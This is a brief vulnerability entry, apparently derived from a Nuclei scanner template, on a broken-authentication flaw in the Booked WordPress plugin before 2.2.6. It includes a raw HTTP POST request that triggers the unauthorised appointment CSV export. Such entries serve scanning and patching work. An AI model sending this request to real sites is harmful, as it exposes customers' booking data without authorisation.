# Vulnerability: Booked < 2.2.6 - Broken Authentication
**Classification:** WORDPRESS
**Source:** Nuclei Template (`booked-export-csv.yaml`)

## Description
The Booked plugin for WordPress is vulnerable to authorization bypass due to missing capability checks on several functions hooked via AJAX actions in versions up to, and including, 2.2.5. This makes it possible for authenticated attackers with subscriber-level permissions and above to execute several unauthorized actions.

## Secure Mitigation
Fixed in version 2.2.6

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-admin/admin-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

booked_export_appointments_csv=
```

